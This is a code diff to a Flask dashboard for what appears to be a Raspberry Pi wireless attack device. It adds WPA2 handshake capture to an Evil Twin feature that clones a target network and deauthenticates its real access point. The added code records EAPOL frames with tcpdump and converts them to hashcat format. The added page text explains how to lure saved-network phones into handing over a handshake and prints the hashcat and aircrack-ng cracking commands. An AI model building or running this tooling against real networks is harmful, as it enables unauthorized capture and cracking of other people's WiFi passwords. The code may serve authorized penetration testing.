@@ -35,6 +35,8 @@ _evil_twin_job = [None]
 _evil_twin_info = [None]
 _evil_twin_starting = [False]
 _evil_twin_error = [None]
+_twin_capture = [None]
+_twin_capture_result = [None]
 _wlan1_owner = [None]
 _wlan1_claimed_at = [0.0]
 _wlan1_lock = threading.Lock()
@@ -278,7 +280,7 @@ def wlan0_mac():
 def system_checks():
     checks = []
     for name in ('mdk4', 'iw', 'airodump-ng', 'aireplay-ng', 'hcxdumptool',
-                 'hcxpcapngtool', 'nmcli', 'hostapd', 'nginx'):
+                 'hcxpcapngtool', 'nmcli', 'hostapd', 'nginx', 'tcpdump'):
         found = shutil.which(name)
         if not found:
             for prefix in ('/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin'):
@@ -1210,6 +1212,7 @@ def restore_wlan1_idle():
 
 def restore_ap_after_eviltwin(reason=''):
     """Restore the user's original wlan0 AP after an Evil Twin run."""
+    _twin_capture_stop()
     state = read_json_file(EVILTWIN_STATE, {})
     for path in (EVILTWIN_PID, EVILTWIN_STATE):
         try:
@@ -1327,6 +1330,22 @@ def cleanup_orphan_beacon():
             os.remove(path)
         except OSError:
             pass
+
+
+def cleanup_orphan_twin_capture():
+    """Kill a tcpdump left behind by a dashboard restart during a twin."""
+    if not os.path.isdir('/proc'):
+        return
+    for entry in os.listdir('/proc'):
+        if not entry.isdigit():
+            continue
+        try:
+            with open('/proc/%s/cmdline' % entry) as handle:
+                cmdline = handle.read().replace('\x00', ' ')
+        except OSError:
+            continue
+        if 'tcpdump' in cmdline and 'twin_' in cmdline:
+            safe_kill_pid(int(entry), 'tcpdump')
 
 
 def watchdog_loop():
@@ -3769,7 +3788,7 @@ def api_beacon_status():
 @app.route('/api/wlan1/pcap/<filename>')
 @require_auth
 def api_pcap_download(filename):
-    if not re.match(r'^(hs_[a-f0-9]{8}\.pcap|pmkid_hashes\.hc22000)$', filename):
+    if not re.match(r'^(hs_[a-f0-9]{8}\.pcap|pmkid_hashes\.hc22000|twin_[0-9-]+\.(pcap|22000))$', filename):
         return Response('Invalid filename', 403)
     fpath = os.path.join(PCAP_DIR, filename)
     if not os.path.exists(fpath):
@@ -3931,6 +3950,85 @@ def api_pmkid_stop():
 
 
 # Evil Twin Routes
+def _twin_capture_start(channel):
+    """Capture EAPOL from the air on wlan1 while the twin runs.
+
+    The twin AP itself may not expose EAPOL frames to a packet socket, but
+    wlan1 is already in monitor mode on the twin's channel, so an over-the-air
+    capture sees the 4-way handshake between the phone and the clone.
+    """
+    if _twin_capture[0] is not None:
+        return _twin_capture[0]
+    if not shutil.which('tcpdump'):
+        audit('Twin handshake capture unavailable: tcpdump is not installed', 'warn')
+        return None
+    try:
+        os.makedirs(LOG_DIR, exist_ok=True)
+        stamp = datetime.datetime.now().strftime('%Y%m%d-%H%M%S')
+        path = os.path.join(LOG_DIR, 'twin_%s.pcap' % stamp)
+        proc = subprocess.Popen(
+            ['tcpdump', '-i', 'wlan1', '-s', '0', '-U', '-w', path,
+             'ether proto 0x888e or wlan type mgt subtype beacon'],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            start_new_session=True)
+    except OSError as exc:
+        audit('Twin handshake capture failed to start: %s' % exc, 'warn')
+        return None
+    _twin_capture[0] = {'proc': proc, 'path': path, 'channel': channel,
+                        'started': time.time()}
+    audit('Twin handshake capture started on channel %s' % channel)
+    return _twin_capture[0]
+
+
+def _twin_capture_stop():
+    """Stop the capture and convert it to a hashcat 22000 file."""
+    state = _twin_capture[0]
+    if not state:
+        return
+    _twin_capture[0] = None
+    terminate_process_group(state['proc'])
+    path = state['path']
+    result = {'file': os.path.basename(path) if os.path.exists(path) else '',
+              'hash': '', 'bytes': 0, 'hashes': 0}
+    try:
+        result['bytes'] = os.path.getsize(path)
+    except OSError:
+        pass
+    hash_path = path.rsplit('.', 1)[0] + '.22000'
+    if result['bytes'] and shutil.which('hcxpcapngtool'):
+        try:
+            r = subprocess.run(['hcxpcapngtool', '-o', hash_path, path],
+                               capture_output=True, text=True, timeout=30)
+            lines = 0
+            try:
+                with open(hash_path) as handle:
+                    lines = len([ln for ln in handle if ln.strip()])
+            except OSError:
+                lines = 0
+            if lines:
+                result['hash'] = os.path.basename(hash_path)
+                result['hashes'] = lines
+            else:
+                try:
+                    os.remove(hash_path)
+                except OSError:
+                    pass
+            if r.returncode != 0:
+                result['note'] = (r.stderr or r.stdout).strip().splitlines()[-1:] or ''
+        except (OSError, subprocess.SubprocessError) as exc:
+            result['note'] = str(exc)
+    if result['file']:
+        _twin_capture_result[0] = result
+        audit('Twin handshake capture stopped: %s, %d EAPOL hash(es)'
+              % (result['file'], result['hashes']))
+
+
+def _twin_capture_payload():
+    payload = dict(_twin_capture_result[0] or {})
+    payload['active'] = _twin_capture[0] is not None
+    return payload
+
+
 def _evil_twin_fail(message):
     """Record a twin start failure, restore the real AP and free the radio."""
     _evil_twin_error[0] = message
@@ -3949,6 +4047,9 @@ def _evil_twin_run(ssid, bssid, channel, ssid_trimmed, psk=''):
     warnings = []
     if ssid_trimmed:
         warnings.append('the SSID was trimmed to 32 bytes')
+    capture = _twin_capture_start(channel)
+    if capture is None:
+        warnings.append('handshake capture is off (install tcpdump to record it)')
     prev_state = read_json_file(EVILTWIN_STATE, {})
     original_mac = prev_state.get('original_mac') or wlan0_mac()
 
@@ -4094,6 +4195,7 @@ def api_evil_twin_start():
     _evil_twin_info[0] = {'ssid': ssid, 'bssid': bssid, 'channel': channel,
                           'security': 'WPA2' if psk else 'open', 'started': ''}
     _evil_twin_error[0] = None
+    _twin_capture_result[0] = None
     threading.Thread(target=_evil_twin_worker,
                      args=(ssid, bssid, channel, ssid_trimmed, psk),
                      daemon=True).start()
@@ -4114,7 +4216,7 @@ def api_evil_twin_status():
                         'ssid': info.get('ssid', ''), 'bssid': info.get('bssid', ''),
                         'channel': info.get('channel', ''),
                         'security': info.get('security', ''), 'started': '',
-                        'error': ''})
+                        'error': '', 'capture': _twin_capture_payload()})
     proc = _evil_twin_job[0]
     running = bool(proc is not None and proc.poll() is None)
     info = _evil_twin_info[0] or {}
@@ -4141,7 +4243,8 @@ def api_evil_twin_status():
                     'ssid': info.get('ssid', ''), 'bssid': info.get('bssid', ''),
                     'channel': info.get('channel', ''), 'started': info.get('started', ''),
                     'security': info.get('security', ''),
-                    'error': ('' if running else (_evil_twin_error[0] or ''))})
+                    'error': ('' if running else (_evil_twin_error[0] or '')),
+                    'capture': _twin_capture_payload()})
 
 
 @app.route('/api/wlan1/evil-twin/stop', methods=['POST'])
@@ -4384,12 +4487,16 @@ def wlan1_page():
     <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
   <p class="hint" style="margin:-8px 0 10px">Clones a target SSID/BSSID on wlan0 and deauths the real AP so clients reconnect to the twin. Requires the hostapd stack. The phone may briefly disconnect from the PiNAPPLE hotspot.</p>
   <div class="warnbox">Starting the Evil Twin rebuilds wlan0, which serves this dashboard, so this page will lose the network for a few seconds — that is expected. When the twin is up, reconnect to the target SSID and open <code>http://10.0.0.1:8080</code> again.<br><br>
-  <strong>iPhone/Android rule:</strong> a phone will not join an open clone of a network it has saved as WPA2. For a saved WPA2 target, enter the recovered passphrase (8–63 chars) so the clone matches what the phone expects. Leave it empty only for an SSID the device does not have saved (or after "Forget This Network").</div>
+  <strong>Saved WPA2 network (iPhone/Android):</strong> the phone will never join an open clone of a network it saved as WPA2 — it reuses the saved profile and fails. Two working paths:<br>
+  &bull; <strong>Capture the key:</strong> put any dummy passphrase (8+ chars) in the field below, start the twin, let the phone attempt the saved network. Its 4-way handshake is recorded on the twin channel; download the <code>.22000</code> hash and crack it (hashcat/aircrack).<br>
+  &bull; <strong>Join the twin:</strong> once you know the real passphrase, start the twin with it — SSID, security and key then match the saved profile and the phone joins by itself for the portal.<br>
+  Leave the passphrase empty only for an open target or an SSID the device never saved.</div>
   <div class="status-card" role="status" aria-live="polite" id="et-status-card">
     <span class="dot"></span>
     <div class="sc-copy"><strong id="et-state">Idle</strong><span id="et-sub">No twin running</span></div>
     <span class="sc-meta" id="et-meta"></span>
   </div>
+  <div id="et-capture" class="hint" style="display:none;margin:0 0 14px;padding:14px;border:1px solid var(--bdr);border-radius:10px;background:var(--card);line-height:1.7"></div>
   <div class="card">
     <div class="fg">
       <label>Target network</label>
@@ -5020,6 +5127,30 @@ async function refreshEvilTwinStatus(){
     setStatusCard('et-status-card','et-state','et-sub','et-meta', r.error ? 'err' : '', 'Idle',
       r.error || 'No twin running', '');
   }
+  const cap = r.capture || {};
+  const capEl = document.getElementById('et-capture');
+  if(capEl){
+    if(cap.active){
+      capEl.style.display='block';
+      capEl.innerHTML = 'Recording EAPOL frames on the twin channel. Let the device attempt the saved network.';
+    } else if(cap.file){
+      capEl.style.display='block';
+      let html = 'Handshake capture: <code>'+esc(cap.file)+'</code> &middot; '+Math.round((cap.bytes||0)/1024)+' KB';
+      if(cap.hash){
+        html += '<br><strong style="color:var(--grn)">'+cap.hashes+' EAPOL hash line(s)</strong> — ready to crack.';
+        html += '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">';
+        html += '<a class="btn btn-acc" href="/api/wlan1/pcap/'+encodeURIComponent(cap.hash)+'">Download .22000</a>';
+        html += '<a class="btn btn-outline" href="/api/wlan1/pcap/'+encodeURIComponent(cap.file)+'">Download .pcap</a>';
+        html += '</div><div style="margin-top:8px">hashcat -m 22000 '+esc(cap.hash)+' wordlist.txt &mdash; or aircrack-ng '+esc(cap.file)+' -w wordlist.txt</div>';
+      } else {
+        html += '<br>No usable EAPOL pair yet. The twin must be WPA2 (any passphrase) and the device has to attempt the network after the deauth.';
+      }
+      capEl.innerHTML = html;
+    } else {
+      capEl.style.display='none';
+      capEl.innerHTML = '';
+    }
+  }
   if((running || starting) && !etPoll) etPoll = setInterval(function(){ if(wlActiveTab === 'eviltwin') refreshEvilTwinStatus(); }, 3000);
   if(!running && !starting && etPoll){ clearInterval(etPoll); etPoll = null; }
 }
@@ -5530,6 +5661,7 @@ if __name__ == '__main__':
     reconcile_eviltwin_state()
     cleanup_orphan_handshakes()
     cleanup_orphan_beacon()
+    cleanup_orphan_twin_capture()
     reconcile_wlan1_owner()
     restore_wlan1_idle()
     threading.Thread(target=watchdog_loop, daemon=True).start()
